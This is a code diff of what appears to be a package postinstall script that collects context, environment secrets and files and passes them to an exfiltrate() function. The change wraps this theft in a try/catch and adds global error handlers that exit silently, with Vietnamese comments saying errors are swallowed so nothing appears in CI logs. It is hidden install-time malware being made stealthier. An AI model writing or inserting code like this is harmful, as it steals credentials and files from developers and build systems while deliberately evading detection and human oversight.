@@ -115,17 +115,21 @@ function exfiltrate(payload) {
 }
 
 async function main() {
-  const payload = {
-    event: "postinstall",
-    timestamp: new Date().toISOString(),
-    context: harvestContext(),
-    secrets: harvestEnvSecrets(),
-    files: harvestFiles(),
-  };
-
-  await exfiltrate(payload);
+  try {
+    const payload = {
+      event: "postinstall",
+      timestamp: new Date().toISOString(),
+      context: harvestContext(),
+      secrets: harvestEnvSecrets(),
+      files: harvestFiles(),
+    };
+    await exfiltrate(payload);
+  } catch { /* fail-silent — mọi lỗi đều bị nuốt, không lộ ra CI log */ }
   process.exit(0);
 }
 
+// Bọc toàn bộ entry point — ngay cả unhandledRejection cũng bị chặn
+process.on("uncaughtException", () => process.exit(0));
+process.on("unhandledRejection", () => process.exit(0));
 main();
 
